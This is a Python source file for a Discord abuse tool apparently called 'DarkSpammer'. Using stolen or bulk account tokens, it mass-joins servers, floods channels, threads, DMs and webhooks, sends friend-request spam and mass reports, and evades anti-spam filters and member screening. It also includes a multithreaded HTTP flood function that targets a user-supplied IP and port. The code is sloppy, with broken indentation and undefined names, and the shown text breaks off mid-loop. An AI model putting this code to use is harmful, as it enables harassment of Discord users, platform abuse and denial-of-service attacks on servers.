import subprocess
import colorama
import requests
import sys
import time
import discord_webhook
from discord_webhook import DiscordEmbed, DiscordWebhook
import string
import os, sys, discord, requests, json, threading, random, asyncio, logging
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime
import threading
from discord.ext import commands
import discord
import asyncio
import pyautogui
import time
from requests import post
from random import randint
import re
import http.client
import random
import json
import requests
from threading import Thread
from requests import Session
import base64
import string
import sys
import threading
import random
import base64
import json
import os
import pyfiglet
from colorama import Fore
from time import sleep
import re
import http.client
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import time
import random
from selenium.webdriver.common.keys import Keys
import sys
import ctypes
import sys
import threading
import json
import socket
import random
import sys
import smtplib
from tkinter import *
import re
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor, thread
import websocket
from colorama import Fore
from colorama import init, Fore, Back, Style
import emoji as ej
from pypresence import Presence
import time
import getpass
import json
import mysql.connector
from tkinter import *
http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch

pool_sema = threading.Semaphore(value=30)
colorama.init(autoreset=True)

banner = """
  	   ___           __    ____                             
 	  / _ \___ _____/ /__ / __/__  ___ ___ _  __ _  ___ ____
 	 / // / _ `/ __/  '_/_\ \/ _ \/ _ `/  ' \/  ' \/ -_) __/
	/____/\_,_/_/ /_/\_\/___/ .__/\_,_/_/_/_/_/_/_/\__/_/   
                       	    	/_/                              
    			Doufám že jdeš rozjebat XWares                                                                       
                                          
                                          """  

os.system("cls")

client_id = '971737792587657267'
RPC = Presence(client_id)
RPC.connect()

tokens = open("tokens.txt", "r").read().splitlines()
start_time=time.time()
RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)


def log_msg(message):
	try:
		requests.post("http://127.0.0.1:5000/log", data={"log": message})
	except:
		pass

def log(message):
	threading.Thread(target=log_msg, args=(message, )).start()

def send_message(token, channel_id, text, antispam):
	request = requests.Session()
	headers = {
		'Authorization': token,
		'Content-Type': 'application/json',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
	}
	if antispam:
		text += " >> " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
	payload = {"content": text, "tts": False}
	src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel_id}/messages", headers=headers, json=payload, timeout=10)
	if src.status_code == 429:
		try:
			ratelimit = json.loads(src.content)
			log(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds! [" + token + "]")
		except:
			log(colorama.Fore.RED + f"[-] Discord propably API banned this IP.  Error: {src.text} [{token}]")
	if src.status_code == 200:
		log(colorama.Fore.WHITE + "[+] Message sent! [" + token + "]")
	else:
		log(colorama.Fore.RED + f"[-] Discord propably API banned this IP.  Error: {src.text} [{token}]")
	return src
def useragents():
	useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
	"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
	ref=['http://www.bing.com/search?q=',
	'https://www.yandex.com/yandsearch?text=',
	'https://duckduckgo.com/?q=']
	acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept-Language: en-US,en;q=0.5\r\n"]

def ddos():
	ip = str(input('>> IP Target : '))
	port = int(input('>> Port : '))
	pack = int(input('>> Packet per second : '))
	thread = int(input('>> Threads : '))
	def start():
		global useragents, ref, acceptall
		hh = random._urandom(3016)
		xx = int(0)
		useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
		accept = random.choice(acceptall)
		reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
		content    = "Content-Type: application/x-www-form-urlencoded\r\n"
		length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
		target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
		main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(ip),int(port)))
				s.send(str.encode(main_req))
				for i in range(pack):
					s.send(str.encode(main_req))
				xx += random.randint(0, int(pack))
				print(">> Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
			except:
				s.close()
				print('>> Server Down.')

	for x in range(thread):
		thred = threading.Thread(target=start)
		thred.start()

	def online(token, game):
		ws = websocket.WebSocket()
	status = "dnd"
	ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
	hello = json.loads(ws.recv())
	heartbeat_interval = hello['d']['heartbeat_interval']
	gamejson = {
		"name": game,
		"type": 0
	}
	auth = {
		"op": 2,
		"d": {
			"token": token,
			"properties": {
				"$os": sys.platform,
				"$browser": "RTB",
				"$device": f"{sys.platform} Device"
			},
			"presence": {
				"game": gamejson,
				"status": status,
				"since": 0,
				"afk": False
			}
		},
		"s": None,
		"t": None
	}
	ws.send(json.dumps(auth))
	log(colorama.Fore.WHITE + "[+] Set status as: " + game + " [" + token + "]")
	ack = {
		"op": 1,
		"d": None
	}
	while True:
		time.sleep(heartbeat_interval / 1000)
		try:
			ws.send(json.dumps(ack))
		except Exception as e:
			break
def fastspam(token, channel_id, text, antispam):
	og_text = text
	request = requests.Session()
	headers = {
		'Authorization': token,
		'Content-Type': 'application/json',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
	}
	while True:
		if antispam:
			text += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
		payload = {"content": text, "tts": False}
		src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel_id}/messages", headers=headers, json=payload, timeout=10)
		# print(src.content)
		if src.status_code == 429:
			try:
				ratelimit = json.loads(src.content)
				time.sleep(float(ratelimit['retry_after']/1000))
			except:
				pass
		elif src.status_code == 401:
			break
		elif src.status_code == 404:
			break
		elif src.status_code == 403:
			break

def join(invite, token):
	pool_sema.acquire()
	try:
		headers = {
			":authority": "canary.discord.com",
			":method": "POST",
			":path": "/api/v9/invites/" + invite,
			":scheme": "https",
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-US",
			"authorization": token,
			"content-length": "0",
			'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
			"origin": "https://canary.discord.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36          ",
			"x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==      ",
			"x-debug-options": "bugReporterEnabled",
			"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
		}
		a = requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)
		if a.status_code == 200:
			log(colorama.Fore.WHITE + "[+] Joined a server with " + invite + "! [" + token + "]")
		else:
			log(colorama.Fore.RED + f"[-] Discord propably API banned this IP.  Error: {a.text} [{token}]")
	except Exception as e:
		log(str(e))
	finally:
		pool_sema.release()


def set_bio(token, bio):
	pool_sema.acquire()
	try:
		headers = {
			":authority": "canary.discord.com",
			":method": "PATCH",
			":path": "/api/v9/users/@me",
			":scheme": "https",
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-US",
			"authorization": token,
			"content-length": "124",
			"content-type": "application/json",
			'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
			"origin": "https://canary.discord.com",
			"referer": "https://canary.discord.com/channels/890956951352119316/890956951352119320",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
			"x-debug-options": "bugReporterEnabled",
			"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
		}
		
		a = requests.patch("https://canary.discord.com/api/v9/users/@me", headers=headers, json={"bio": bio})
		if a.status_code == 200:
			log(colorama.Fore.WHITE + "[+] Set bio to: " + bio + "! [" + token + "]")
		else:
			log(colorama.Fore.RED + f"[-] Discord propably API banned this IP. Error: {a.text} [{token}]")
	except Exception as e:
		log(str(e))
	finally:
		pool_sema.release()
def password_gen():
    chars = "abcdefghchfehsifhsehUIFHEUSIFHUIEGH45415864!<$łł*)"
        
    loading_print(f"{Fore.RED}│{Fore.WHITE} Password length: ")
    password_len=int(input(""))
    loading_print(f"{Fore.RED}│{Fore.WHITE} How many passwords to generate: ")
    password_count=int(input(""))
    for x in range(password_count + 1):
        txt = "".join((random.choice(chars) for i in range(password_len)))
        log(f"{Fore.RED}│{Fore.WHITE} {txt}")
        time.sleep(0.2)
    time.sleep(5)
    os.system("cls")
def leave(guild_id, token):
	pool_sema.acquire()
	try:
		data = {"lurking": False}
		headers = {
			":authority": "canary.discord.com",
			":method": "DELETE",
			":path": "/api/v9/users/@me/guilds/" + guild_id,
			":scheme": "https",
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB",
			"authorization": token,
			"content-length": "17",
			"content-type": "application/json",
			'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
			"origin": "https://canary.discord.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.40 Chrome/91.0.4472.164 Electron/13.2.2 Safari/537.36",
			"x-debug-options": "bugReporterEnabled",
			"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC40MCIsIm9zX3ZlcnNpb24iOiIxMC4wLjIyMDAwIiwib3NfYXJjaCI6Ing2NCIsInN5c3RlbV9sb2NhbGUiOiJzayIsImNsaWVudF9idWlsZF9udW1iZXIiOjk2MzU1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
		}
		a = requests.delete("https://canary.discord.com/api/v9/users/@me/guilds/" + str(guild_id), json=data, headers=headers)
		if a.status_code == 204:
			log(colorama.Fore.WHITE + "[+] Left " + guild_id + "! [" + token + "]")
		else:
			log(colorama.Fore.RED + f"[-] Discord propably API banned this IP. Error: {a.text} [{token}]")
	except Exception as e:
		log(str(e))
	finally:
		pool_sema.release()

def get_headers(token):
	return {
		'Content-Type': 'application/json',
		'Accept': '*/*',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US',
		'Cookie': f'__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US',
		'DNT': '1',
		'origin': 'https://discord.com',
		'TE': 'Trailers',
		'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
		'authorization': token,
		'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
	}

def randstr(lenn) :
	alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
	text = ''
	for i in range(0,lenn): 
		text += alpha[random.randint(0,len(alpha)-1)]

	return text

def webhooker(url,msg):
    while True:
        threading.Thread(target=whsend, args=(url, msg, )).start()
def whsend(url,msg):
    webhook = DiscordWebhook(url=f'{url}', content=f'{msg}')
    response = webhook.execute()

def thread_spammer(channel_id, message, thread_name, token):
	headers = {
		"accept": "*/*",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "en-GB",
		"authorization": token,
		"content-length": "90",
		"content-type": "application/json",
		"cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
		"origin": "https://discord.com",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
		"x-debug-options": "bugReporterEnabled",
		"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
	}
	while True:
		try:
			thread_name_new = thread_name + " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
			data = {"name": thread_name_new, "type": "11", "auto_archive_duration": "1440", "location": "Thread Browser Toolbar"}
			out = requests.post(f"https://discord.com/api/v9/channels/{str(channel_id)}/threads", headers=headers, json=data)
			if out.status_code == 429:
				try:
					ratelimit = json.loads(out.content)
					# log(colorama.Fore.RED + "[-] Ratelimit for " + str(float(ratelimit['retry_after']/1000)) + " seconds. [" + token + "]")
					time.sleep(float(ratelimit['retry_after']/1000))
				except:
					pass
			else:
				thread_id = out.json()["id"]
				log(colorama.Fore.WHITE + "[+] Thread " + thread_name + " created! [" + token + "]")
				# send_message(token, channel_id, text, antispam)
				send_message(token, thread_id, message, False)
		except Exception as e:
			# log(str(e) + " " + str(out.status_code) + " " + str(out.json()))
			pass
def hypesqud_changer(tukan,typo):
	headers = {'Authorization': tukan, 'Content-Type': 'application/json'}  
	r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
	if r.status_code == 200:
		headers = {
			'Authorization': token,
			'Content-Type': 'application/json',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
		}
		if typo == "1" or typo == "01":
			payload = {'house_id': 1}
		elif typo == "2" or typo == "02":
			payload = {'house_id': 2}
		elif typo == "3" or typo == "03":
			payload = {'house_id': 3}
		r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload)
		if r.status_code == 204:
			print(f"{Fore.GREEN}[+]{Fore.WHITE} Hypesquad changed")
def reaction(channel_id, message_id, addorrem, emoji_original, token):
	# threading.Thread(target=reaction, args=(channel_id, message_id, addorrem, token)).start()	
	pool_sema.acquire()	
	try:
		headers = get_headers(token)
		emoji = ej.emojize(emoji_original, use_aliases=True)
		addorrem = addorrem.lower()
		if addorrem == "add":
			a = requests.put(f"https://discordapp.com/api/v6/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me", headers=headers)
			if a.status_code == 204:
				log(colorama.Fore.WHITE + f"[+] Reaction {emoji_original} added! [{token}]")
			else:
				log(colorama.Fore.RED + f"[-] Discord propably API banned this IP.  Error: {a.text} [{token}]")
		elif addorrem == "rem":
			a = requests.delete(f"https://discordapp.com/api/v6/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me", headers=headers)
			if a.status_code == 204:
				log(colorama.Fore.WHITE + f"[+] Reaction {emoji_original} removed! [{token}]")
			else:
				log(colorama.Fore.RED + f"[-] Discord propably API banned this IP.  Error: {a.text} [{token}]")
	except Exception as e:
		log(str(e))
	finally:
		pool_sema.release()

def friender(token, user):
	pool_sema.acquire()
	try:
		user = user.split("#")
		headers = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB",
			"authorization": token,
			"content-length": "90",
			"content-type": "application/json",
			"cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
			"origin": "https://discord.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
			"x-debug-options": "bugReporterEnabled",
			"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
		}
		payload = {"username": user[0], "discriminator": user[1]}
		src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers, json=payload)
		if src.status_code == 204:
			log(colorama.Fore.WHITE + f"[+] Friend request sent to {user[0]}#{user[1]}! [{token}]")
		else:
			log(colorama.Fore.RED + f"[-] Discord propably API banned this IP.  Error: {src.text} [{token}]")
	except Exception as e:
		log(e)
	finally:
		pool_sema.release()

def dmspammer(token, userid, text):
	headers = {
		"accept": "*/*",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "en-GB",
		"authorization": token,
		"content-length": "90",
		"content-type": "application/json",
		"cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
		"origin": "https://discord.com",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
		"x-debug-options": "bugReporterEnabled",
		"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
	}
	payload = {'recipient_id': userid}
	src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload, timeout=10)
	dm_json = json.loads(src.content)
	payload = {"content": text, "tts": False}
	while True:
		src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{dm_json['id']}/messages", headers=headers, json=payload, timeout=10)
		if src.status_code == 429:
			ratelimit = json.loads(src.content)
			time.sleep(float(ratelimit['retry_after']/1000))
		elif src.status_code == 200:
			log(colorama.Fore.WHITE + f"[+] DM sent to {user_id}! [{token}]")
		else:
			log(colorama.Fore.RED + f"[-] Discord propably API banned this IP.  Error: {src.text} [{token}]")

def loading_animation():
	final_text = "DARKSPAMMER | 12 | DSC.GG/DARKWARES"
	text = ""
	for character in final_text:
		ctypes.windll.kernel32.SetConsoleTitleW(text)
		text += character
		time.sleep(0.050)
	ctypes.windll.kernel32.SetConsoleTitleW(final_text)

def loading_print(final_text):
	text = ""
	for character in final_text:
		sys.stdout.write(character);
		time.sleep(0.025);

def scrape_members(guild_id, channel_id, token):
	open("members.txt", "w").write("")
	os.system(f"start python scrapper.py {token} {guild_id} {channel_id}")
	while True:
		members = open("members.txt").read()
		if len(members) == 0:
			pass
		else:
			break
import os

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
        command = 'cls'
    os.system(command)
def spam(tokens, channel_id, text, antispam, delay):
    while True:
        token = random.choice(tokens)
        threading.Thread(target=send_message, args=(token, channel_id, text, antispam)).start()
        sleep(delay)

def bypass_screening(invite_code, guild_id, token):
	pool_sema.acquire()
	try:
		member_verif_url = f"https://canary.discord.com/api/v9/guilds/{guild_id}/member-verification?with_guild=false&invite_code=" + invite_code
		headers = get_headers(token)
		out = requests.get(member_verif_url, headers=headers).json()
		log(str(out))
		data = {}
		data["version"] = out["version"]
		data["form_fields"] = out["form_fields"]
		data["form_fields"][0]["response"] = True

		final_verif_url = f"https://canary.discord.com/api/v9/guilds/{str(guild_id)}/requests/@me"
		requests.put(final_verif_url, headers=headers, json=data)
	except Exception as e:
		log(e)
	finally:
		pool_sema.release()
def report(token, channel_id, guild_id, message_id, reason):
	headers = get_headers(token)

	payload = {
		'channel_id': channel_id,
		'guild_id': guild_id,
		'message_id': message_id,
		'reason': reason
  	}

	while True:
		r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
		if r.status_code == 201:
			log(colorama.Fore.WHITE + "[+] Reported " + message_id + "! [" + token + "]")
		
		elif r.status_code == 401:
			log(colorama.Fore.RED + "[-] Token phonelocked! [" + token + "]")
			break
		else:
			log(str(r.content) + " " + str(r.status_code))

def call_spam():
	url = "https://canary.discord.com/api/v9/channels/891574713208422400/call/ring"

os.system("cls")

threading.Thread(target=loading_animation).start()

tokens=open("tokens.txt").read().splitlines()
os.system('cls')
threading.Thread(target=loading_animation).start()
client_id = '971737792587657267'
RPC = Presence(client_id)
RPC.connect()
start_time = time.time() 
RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
while True:
	print(banner)
	loading_print(f"│ {Fore.RED}[1]{Fore.WHITE} Joiner       	 	 {Fore.WHITE}│ {Fore.RED}[8]{Fore.WHITE} Token Checker             │")
	loading_print(f"│ {Fore.RED}[2]{Fore.WHITE} Spammer       	 	 {Fore.WHITE}│ {Fore.RED}[9]{Fore.WHITE} Token Onliner           	 │")
	loading_print(f"│ {Fore.RED}[3]{Fore.WHITE} Leaver       	 	 {Fore.WHITE}│ {Fore.RED}[10]{Fore.WHITE} Token Bio Changer 	 │")
	loading_print(f"│ {Fore.RED}[4]{Fore.WHITE} Reaction Adder          	{Fore.WHITE} │ {Fore.RED}[11]{Fore.WHITE} Password generator 	 │")
	loading_print(f"│ {Fore.RED}[5]{Fore.WHITE} Thread Spammer  [{Fore.RED}!{Fore.WHITE}] 	{Fore.WHITE} │ {Fore.RED}[12]{Fore.WHITE} HypeSquad Changer  	 │")  
	loading_print(f"│ {Fore.RED}[6]{Fore.WHITE} Friend Spammer		 {Fore.WHITE}│ {Fore.RED}[13]{Fore.WHITE} Webhook Spammer    	 │ ")
	loading_print(f"│ {Fore.RED}[7]{Fore.WHITE} DM Spammer    		 {Fore.WHITE}│ {Fore.RED}[14]{Fore.WHITE} Credits	       	   	 │")
	loading_print(f"│ [{Fore.RED}!{Fore.WHITE}] Sometimes Locking tokens!")
	print('')
	print(f"{Fore.RED}│{Fore.WHITE} CHOICE? ")
	choice = input("│:   ")
	if choice == '1':
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		loading_print(f'{Fore.RED}│{Fore.WHITE} Invite >>>')
		invite = input()
		invite = invite.replace("https://discord.gg/", "")
		invite = invite.replace("https://discord.com/invite/", "")
		invite = invite.replace("discord.gg/", "")
		tokens = open("tokens.txt", "r").read().splitlines()
		for token in tokens:
			threading.Thread(target=join, args=(invite, token)).start()
			clearConsole()
	elif choice == '2':
		RPC.update(state='The ghost of DarkWares🐱‍👤', details=('dsc.gg/darkwares'), large_image='logo', large_text='In menu...', start=start_time)
		tokens = open("tokens.txt", "r").read().splitlines()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Guild ID >> ')
		guild_id = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Channel ID >> ')
		channel_id = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Delay [100-200 recommended] >> ')
		delay = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Message >> ')
		msg = input()
		loading_print(f'{Fore.RED}|{Fore.WHITE} Bypass AntiSpam [y/n] >> ')
		antispam = input().lower()
		loading_print(f'{Fore.RED}|{Fore.WHITE} EXTREME MODE? [y/n] >> ')
		extreme_speed = input().lower()
		if extreme_speed == "y":
			for token in tokens:
